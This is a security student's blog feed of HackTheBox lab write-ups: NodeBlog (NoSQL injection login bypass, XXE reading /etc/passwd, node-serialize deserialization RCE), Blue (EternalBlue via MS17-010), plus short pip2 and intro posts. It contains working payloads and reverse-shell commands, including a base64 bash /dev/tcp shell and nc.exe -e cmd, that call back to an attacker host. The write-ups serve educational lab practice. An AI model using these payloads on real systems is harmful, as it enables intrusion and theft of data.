+<p>Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!</p>
+
+<h2 id="ports-recognizement">Ports recognizement</h2>
+<p>The ip address of the machine is 10.10.11.139
+We are going to recognise all the post open on the machine and export the result into a grepeable file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.139 <span class="nt">-oG</span> ports
+</code></pre></div></div>
+<p>The ports open are 22,5000</p>
+
+<p>We are going to scan this ports and export into a nmap file</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sSV</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-p22</span>,5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.139 <span class="nt">-oN</span> services
+</code></pre></div></div>
+<p>We can see there is a ssh service running at port 22 and a http (node.js) service running at port 5000</p>
+
+<h2 id="inspect-the-web-and-fuzzing">Inspect the web and fuzzing</h2>
+<p>While we inspect the web we are going to leave wfuzz fuzzing the site in case it find something relevant.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">--hc</span> 404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-c</span> <span class="nt">-u</span> 10.10.11.139:5000/FUZZ
+</code></pre></div></div>
+
+<p>We can see a green login button. Let’s proceed.
+We can see a login form.
+We can try some sql inyection inputs like ‘ or ‘ – -
+but won’t work.</p>
+
+<p>We have to test also nosql inyection. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadAllTheThings</a> have some exploit to bypass login form.
+We are going to use burpsuite to intercept the response and modify the fields on the forms.</p>
+
+<p>If we input random logins we have the response Invalid Username, but if we set in the username field admin and in the password random text we get Invalid Password, so we have a method to get users.
+Now we can try bypass the password with nosqli.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"user"</span>: <span class="s2">"admin"</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}}</span>
+</code></pre></div></div>
+<p>Also we can make a script to dump all posible usernames ans their relative passwords <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/nosqlbruteforce.py">nosqlforce.py</a></p>
+
+<blockquote>
+  <p>WE ARE INSIDE :boom:
+<br /></p>
+</blockquote>
+
+<p>We see an upload button. We try to upload a random file and we get this response:</p>
+
+<p>This might be a vulnerability to XXE inyection.
+Also <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadAllTheThings</a> cover this subject with some payloads.
+We can try some payloads like</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;</span>]&gt;<span class="nt">&lt;root&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>In /etc/passwd we set the path to the file we want to see.
+We create an xml file with this payload and we can try to upload this.</p>
+
+<p>We have a response that tell us that we give the xml in the incorrect format. If we inspect the code we can see that the correct format is:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid XML Example: <span class="nt">&lt;post&gt;&lt;title&gt;</span>Example Post<span class="nt">&lt;/title&gt;&lt;description&gt;</span>Example Description<span class="nt">&lt;/description&gt;&lt;markdown&gt;</span>Example Markdown<span class="nt">&lt;/markdown&gt;&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<p>So we modify our payload to follow that structure:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+<span class="nt">&lt;post&gt;</span>
+        <span class="nt">&lt;title&gt;</span>Example Post<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;description&gt;</span>Example Description<span class="nt">&lt;/description&gt;</span>
+        <span class="nt">&lt;markdown&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+<p>The &amp;file; contains the output of the payload.</p>
+
+<p>If we look into the source code of the web site we can see the /etc/passwd file wich contains multiple users of the system.</p>
+
+<p>At his point we can enumerate multiple files of the machine.
+We can make a simple script which is going to help to enumerate the site faster <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/xxe-file-dumper.py">xxe-file-dumper.py</a></p>
+
+<p>Let’s continue looking the website. If we try to post another article by our own we get an error:</p>
+
+<p>We can see the web is hosted on the /opt/blog.
+We can look for a server.js or main.js file which usually have the main server code of the web server. Let’s try it. We are going to use <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/xxe-file-dumper.py">xxe-file-dumper.py</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 xxe-file-dumper.py <span class="nt">-u</span> http://10.10.11.139:5000/articles/xml <span class="nt">-f</span> /opt/blog/server.js
+</code></pre></div></div>
+
+<p>We can see the we have an output file:</p>
+<pre><code class="language-node">const express = require(&amp;#39;express&amp;#39;)
+const mongoose = require(&amp;#39;mongoose&amp;#39;)
+const Article = require(&amp;#39;./models/article&amp;#39;)
+const articleRouter = require(&amp;#39;./routes/articles&amp;#39;)
+const loginRouter = require(&amp;#39;./routes/login&amp;#39;)
+const serialize = require(&amp;#39;node-serialize&amp;#39;)
+const methodOverride = require(&amp;#39;method-override&amp;#39;)
+const fileUpload = require(&amp;#39;express-fileupload&amp;#39;)
+const cookieParser = require(&amp;#39;cookie-parser&amp;#39;);
+const crypto = require(&amp;#39;crypto&amp;#39;)
+const cookie_secret = &amp;#34;UHC-SecretCookie&amp;#34;
+//var session = require(&amp;#39;express-session&amp;#39;);
+const app = express()
+
+mongoose.connect(&amp;#39;mongodb://localhost/blog&amp;#39;)
+
+app.set(&amp;#39;view engine&amp;#39;, &amp;#39;ejs&amp;#39;)
+app.use(express.urlencoded({ extended: false }))
+app.use(methodOverride(&amp;#39;_method&amp;#39;))
+app.use(fileUpload())
+app.use(express.json());
+app.use(cookieParser());
+//app.use(session({secret: &amp;#34;UHC-SecretKey-123&amp;#34;}));
+
+function authenticated(c) {
+    if (typeof c == &amp;#39;undefined&amp;#39;)
+        return false
+
+    c = serialize.unserialize(c)
+
+    if (c.sign == (crypto.createHash(&amp;#39;md5&amp;#39;).update(cookie_secret + c.user).digest(&amp;#39;hex&amp;#39;)) ){
+        return true
+    } else {
+        return false
+    }
+}
+
+
+app.get(&amp;#39;/&amp;#39;, async (req, res) =&amp;gt; {
+    const articles = await Article.find().sort({
+        createdAt: &amp;#39;desc&amp;#39;
+    })
+    res.render(&amp;#39;articles/index&amp;#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
+})
+
+app.use(&amp;#39;/articles&amp;#39;, articleRouter)
+app.use(&amp;#39;/login&amp;#39;, loginRouter)
+
+
+app.listen(5000)
+</code></pre>
+
+<p>We can see that the server is using an unserialize function without sanitaze input. This can be a desirializing vulneravility.</p>
+
+<p>Usually the unserialize input is the cookie, because this and It’s called c the code is probably deserializing the cookie.</p>
+
+<p>The problem about the insecure deserilization is that if you use IIFE you can execute code when the function is deserializating even before the string is interpreted. So we can send the payload into the cookie, when the server desirialize the string, this will be executed even the cookie doen’t have any sense.
+This <a href="https://sking7.github.io/articles/1601216121.html">post</a> explain it pretty well.
+The payload is the next:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){require('child_process').exec('ls', function(error, stdout, stderr){console.log(stdout)});}()</span><span class="dl">"</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can inject a revershell payload into the code that we want to run.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/<span class="o">{</span>your_tun0_ip<span class="o">}</span>/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>In order to pass this code into the url we have to convert it in base64</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/{your_tun0_ip}/443 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+<p>In the victim’s machine we have to reverse the base64 format, so our final reverse shell payload is:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg<span class="o">==</span>|base64 <span class="nt">-d</span>|bash
+</code></pre></div></div>
+<p>We mix it the the rec payload, the result:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg==|base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()</span><span class="dl">"</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>With burpsuite we modify the cookie when we make a get request to the main page, we introduce the payload into the cookie. Mention that we have to previusly url encode this entire payload beacuse they are special character that mean’s another thing in a url format (like ;).
+Encoding all will asure us that the payload will work fine.</p>
+
+<p>We start listening with netcat in the 443 port</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 443
+</code></pre></div></div>
+
+<p>We send the payload, and we have a shell!
+We can try to capture the flag which is alocate at /home/admin/user.txt
+For some reason we dont hace permission to read the content of the folder, but our user owns the folder, so we just can chnage permission of the folder with</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x /home/admin
+</code></pre></div></div>
+<p>Now we can see the flag!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/admin/user.txt
+</code></pre></div></div>
+
+<h2 id="privilige-escalation">Privilige escalation</h2>
+<p>We can try use the same password to the super user</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+</code></pre></div></div>
+<p>We introduce the password which we captured before when we dump the password of admin user with <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/nosqlbruteforce.py">nosqlforce.py</a>.
+They reuse the password so we are already logged root.
+We can capture the flag which is located at /root/root.txt</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
+</code></pre></div></div>
+
+<p>Thank’s all for reading! 📖</p>]]></content><author><name>isuckatlinux</name></author><category term="hackthebox" /><category term="writeup" /><category term="nosqlinyection" /><summary type="html"><![CDATA[Introduction Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!]]></summary></entry><entry><title type="html">Blue HTB Write Up</title><link href="https://abusinglinux.com//2021/12/31/blue-htb-writeup.html" rel="alternate" type="text/html" title="Blue HTB Write Up" /><published>2021-12-31T00:00:00+00:00</published><updated>2021-12-31T00:00:00+00:00</updated><id>https://abusinglinux.com//2021/12/31/blue-htb-writeup</id><content type="html" xml:base="https://abusinglinux.com//2021/12/31/blue-htb-writeup.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>Today we are going to PWN a HackTheBox machine called Blue.
+Blue is an easy machine, we are going to use tools such as nmap to scan the ports, crackmapexec to recognise all the network devices via smb.
+We are going to exploit an EternalBlue vulnerability, and finally we are going to learn how to inject code in the victim’s machine through this vulnerability.</p>
+
+<h2 id="dependencies">Dependencies</h2>
+<ul>
+  <li>
+    <p>In order to everything work you must have Python2 and pip2 installed.
+<a href="../../../../2021/12/30/installing-pip2-on-parrot.html">HowToInstallPip2Parrot</a></p>
+  </li>
+  <li>
+    <p>crackmapexec</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>crackmapexec
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="ports-recognizement">Ports recognizement</h2>
+<p>The ip address of this machine is the 10.10.10.40.
+First we need to indetify all the ports open on the machine, we are going to run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.40 <span class="nt">-oG</span> ports
+</code></pre></div></div>
+<ul>
+  <li>-sS -&gt; TCP SYN (Stealth) Scan</li>
+  <li>–min-rate -&gt; specify the number of packets you are sending per second</li>
+  <li>-p- -&gt; scan all range of ports</li>
+  <li>–open -&gt; only scan open ports</li>
+  <li>-vvv -&gt; while the program in running you can get additional information about hte proccess</li>
+  <li>-n -&gt; don’t use DNS resolution</li>
+  <li>-Pn -&gt; use it if the host is blocking ping proves</li>
+  <li>-oG -&gt; return the result in a grepeable file in order to proccess it later</li>
+</ul>
+
+<p>We are going to use <a href="https://github.com/isuckatlinux/getPorts">getPorts</a> to extract all the relevant data from the nmap output</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getPorts ports
+</code></pre></div></div>
+
+<p>Once we extracted all the ports we are going to find out the service they are running:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p135</span>,139,445,49153 10.10.10.40 <span class="nt">-oN</span> services
+</code></pre></div></div>
+<ul>
+  <li>-oN -&gt; return the output into a nmap file</li>
+  <li>-sV -&gt; enum services</li>
+  <li>-p<em>p1, p2, pn</em> -&gt; specify this ports</li>
+</ul>
+
+<p>We can see port 445 open, this might be a smb vulnerability, let’s find out.
+With <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> we can see all the devices using a service over the entire network (beside other uses)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.0/24
+</code></pre></div></div>
+<p><em>Because we are targeting a particular computer we could also specify this computer and not the entire network</em></p>
+
+<p>We see the host is runnning windows7 🤓 <br />
+MS017, most know as Eternal Blue, was a vulnerability in the smb protocol that affectes WindowsXP and windows7 computers.
+If this haven’t been patched on the machine this means that we already got a very serious vulneravilty in the system that will allow us to execute code as admin.</p>
+
+<p>We are going to see two ways of see if this machine is vulnerable:</p>
+<ol>
+  <li>Nmap scripts.<br />
+Nmap have a lot of scripts that allows checking multiple vulneravilities. These scripts are sorted by categories.
+In order to see all the categories in nmap we could run:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate .nse | xargs <span class="nb">grep</span> <span class="s2">"categories"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'"*"'</span> | <span class="nb">sort</span> <span class="nt">-u</span>
+</code></pre></div>    </div>
+    <p>We can see a bunch of categories, we will cover all the categories in another post soon 🤖.
+For the time we are going to be using “vuln and safe”
+So lets run:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> <span class="s2">"vuln and safe"</span> <span class="nt">-p445</span> 10.10.10.40 <span class="nt">-oN</span> smbVulnerable
+</code></pre></div>    </div>
+    <p><img src="https://abusinglinux.com/assets/images/blue-htb/nmap_scripts_output.png" alt="image1" />
+<br />
+BINGO! We can see in the picture the service is vulnerable</p>
+  </li>
+  <li>Eternal blue checker <br />
+We are going to use a <a href="https://github.com/worawit/MS17-010">checker</a>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/worawit/MS17-010
+<span class="nb">cd </span>MS17-010
+</code></pre></div>    </div>
+    <p>The checker is named <em>checker.py</em><br />
+We run:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 checker.py 10.10.10.40
+</code></pre></div>    </div>
+    <p>We can see all the pipes are denied.
+We have to try the user ‘guest’. We look into the code and we see two fields empty, the username and the password.
+We introduce ‘guest’ in the username string.
+<br />
+We run again:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 checker.py 10.10.10.40
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><img src="https://abusinglinux.com/assets/images/blue-htb/username_guest.PNG" alt="image2" /><br />
+As we can see we have a bunch of pipes that reported OK. <br /></p>
+
+<h2 id="exploiting">Exploiting</h2>
+<p>In the exploiting phase we could use Metasploit, but there is an issue with that. Eternal blue is a kernel-level vulnerability, that means that if anything goes wrong (or everything doesn’t go perfect) we most likely to have blue screen or very inestable shells.
+That’s why in these cases where you want to have all control is actually better to just inject the code yourself.</p>
+
+<p>In order to proceed to inject code we are going to use the repo we used before to check the vulnerability <a href="https://github.com/worawit/MS17-010">MS17-010</a>.</p>
+
+<p>Now we are going to use the zzz_exploit.py
+This exploit run a trivial command on the victim’s machine. We are going to find that command and replace it with our personal one.
+The method we are going to edit is <em>smb_pwn</em>.<br />
+We are going to comment all lines of the code except the first one. And we are going to decomment the <em>service_exec</em> line <br />
+The code should look like this:<br />
+<img src="https://abusinglinux.com/assets/images/blue-htb/zzz_modified.PNG" alt="image3" /></p>
+
+<p>We are going to exploit this vulnerability by sharing a folder with smb witch contains <a href="https://es.wikipedia.org/wiki/Netcat">netcat</a> and we are going to run netcat from the victims machine to produce a reverse shell.
+The command we have to inject is the next</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c <span class="se">\\</span>&lt;your_tun0_ip&gt;<span class="se">\s</span>haredFolder<span class="se">\n</span>c.exe <span class="nt">-e</span> cmd &lt;your_tun0_ip&gt; 443
+</code></pre></div></div>
+<p>So you the line have to look like that:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">service_exec</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="sa">r</span><span class="s">'cmd /c \\&lt;your_tun0_ip&gt;\sharedFolder\nc.exe -e cmd &lt;your_tun0_ip&gt; 443'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>In addition, we have to set the username to ‘guest’ just how we did on the checker</p>
+
+<p>So, the steps are:</p>
+<ol>
+  <li>Share a folder with the netcat
+    <ul>
+      <li>We have to locate netcat in our machine and copy it to our folder wich we are going to be sharing soon
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> locate nc.exe
+ <span class="nb">cp</span> <span class="k">*</span>path_to_netcat<span class="k">*</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
+</code></pre></div>        </div>
+        <p>If you are not able to locate nc.exe here’s a link to download <a href="https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip">netcat</a><br />
+ <em>At this point we have to have netcat in our folder</em></p>
+      </li>
+      <li>Share the folder
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> imppacket-smbserver sharedFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span> 
+</code></pre></div>        </div>
+        <p><em>The flag smb2support is no necessary beacuse we are dealing with version one of the smb protocol, but It’s a good practice to give support v2 just in case</em></p>
+      </li>
+    </ul>
+  </li>
+  <li>Listening at port 443 to get the reverse shell
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nc <span class="nt">-nlvp</span> 443
+</code></pre></div>    </div>
+  </li>
+  <li>Finallly exploiting!
+We could use any pipe the checker reported to be OK.<br />
+We are going to use samr</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zzz_exploit.py 10.10.10.40 samr
+</code></pre></div></div>
+
+<blockquote>
+  <p>BOOM 💥</p>
+</blockquote>
+
+<p>If everything it’s working fine we should see a shell.
+We could run</p>
+<pre><code class="language-cmd">whoami
+</code></pre>
+<p>We should see nt authority system, that means that we have admin privileges.</p>
+
+<p>Now let’s see the flags:</p>
+<pre><code class="language-cmd">cd C:\Users\haris\Desktop
+type user.txt
+
+cd C:\Users\Administrator\Desktop
+type root.txt
+</code></pre>
+
+<p>Thank’s all for reading this! I hope you enjoyed this writing, any feedback is welcome.</p>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+    /*
+    var disqus_config = function () {
+    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://isuckatlinux.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>]]></content><author><name>isuckatlinux</name></author><category term="hackthebox" /><category term="writeup" /><category term="eternal-blue" /><summary type="html"><![CDATA[Introduction Today we are going to PWN a HackTheBox machine called Blue. Blue is an easy machine, we are going to use tools such as nmap to scan the ports, crackmapexec to recognise all the network devices via smb. We are going to exploit an EternalBlue vulnerability, and finally we are going to learn how to inject code in the victim’s machine through this vulnerability.]]></summary></entry><entry><title type="html">Installing pip2 on ParrotOS</title><link href="https://abusinglinux.com//2021/12/30/installing-pip2-on-parrot.html" rel="alternate" type="text/html" title="Installing pip2 on ParrotOS" /><published>2021-12-30T00:00:00+00:00</published><updated>2021-12-30T00:00:00+00:00</updated><id>https://abusinglinux.com//2021/12/30/installing-pip2-on-parrot</id><content type="html" xml:base="https://abusinglinux.com//2021/12/30/installing-pip2-on-parrot.html"><![CDATA[<p>I was practicing my skills at <a href="https://www.hackthebox.com/">HackTheBox</a> and I got a problem,
+python2 (therefore pip2) are officially not longer supported on ParrotOS and Kali.
+Well, thats a big problem because most of the well-know scripts and tools are written in python2.
+In addition they removed pip2 package from the official repositories so you hace to install it by your own.</p>
+<blockquote>
+  <p>Because python2 is not longer supported maybe in later versions having python2/pip2 installed in your system could potencially break it. Do this at your own risk!</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>python2
+curl https://bootstrap.pypa.ip/pip/2.7/get-pip.py <span class="nt">-o</span> get-pip.py
+<span class="nb">sudo </span>python2 get-pip.py
+</code></pre></div></div>
+<p><br /></p>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+    /*
+    var disqus_config = function () {
+    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://isuckatlinux.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>]]></content><author><name>isuckatlinux</name></author><category term="parrot" /><category term="python2" /><summary type="html"><![CDATA[I was practicing my skills at HackTheBox and I got a problem, python2 (therefore pip2) are officially not longer supported on ParrotOS and Kali. Well, thats a big problem because most of the well-know scripts and tools are written in python2. In addition they removed pip2 package from the official repositories so you hace to install it by your own. Because python2 is not longer supported maybe in later versions having python2/pip2 installed in your system could potencially break it. Do this at your own risk!]]></summary></entry><entry><title type="html">My first post</title><link href="https://abusinglinux.com//2021/12/21/my-first-post,-thanks-all!.html" rel="alternate" type="text/html" title="My first post" /><published>2021-12-21T00:00:00+00:00</published><updated>2021-12-21T00:00:00+00:00</updated><id>https://abusinglinux.com//2021/12/21/my%20first%20post,%20thanks%20all!</id><content type="html" xml:base="https://abusinglinux.com//2021/12/21/my-first-post,-thanks-all!.html"><![CDATA[<p>Hi there, Im Pedro García a student of cybersecurity and ethical hacking. I created this blog with the porpouse of sharing my path learning.
+I will be covering a lot of subjects related with computer science and cybersecurity.</p>
+
+<p>I have a pretty solid linux background, I had been using Linux at user level for 5 years already. My goal is learn all the detail of the many Computing services are running right now.</p>
+
+<p>I aprecciate all kind of feedback to improve any aspect of the subjects that we are going to be talking soon.
+I will be adding <a href="https://blog.disqus.com/">Disqus comments</a> pretty soon.</p>
+
+<p>I hope you guys have fun and enjoy reading this blog!
+Thanks a lot!</p>]]></content><author><name>isuckatlinux</name></author><summary type="html"><![CDATA[Hi there, Im Pedro García a student of cybersecurity and ethical hacking. I created this blog with the porpouse of sharing my path learning. I will be covering a lot of subjects related with computer science and cybersecurity.]]></summary></entry></feed>
